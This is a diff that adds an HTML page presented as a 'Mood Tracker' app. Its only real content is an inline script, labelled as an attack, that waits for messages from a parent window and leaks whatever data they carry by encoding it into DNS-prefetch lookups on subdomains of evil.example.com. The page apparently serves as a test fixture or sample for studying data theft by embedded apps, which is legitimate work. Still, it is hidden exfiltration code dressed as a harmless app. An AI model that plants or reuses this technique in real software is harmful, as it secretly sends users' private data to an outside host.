@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Mood Tracker</title>
+</head>
+<body>
+  <div id="root">Loading...</div>
+  <script>
+    // Attack: DNS prefetch for data exfiltration
+    function exfiltrateViaDNS(data) {
+      const encoded = btoa(JSON.stringify(data)).substring(0, 30);
+      const link = document.createElement('link');
+      link.rel = 'dns-prefetch';
+      link.href = 'https://' + encoded + '.evil.example.com';
+      document.head.appendChild(link);
+    }
+    
+    window.addEventListener('message', (event) => {
+      if (event.data && event.data.type === 'data') {
+        exfiltrateViaDNS(event.data.value);
+      }
+    });
+    
+    window.parent.postMessage({ type: 'hello', apiVersion: '1.0.0' }, '*');
+  </script>
+</body>
+</html>
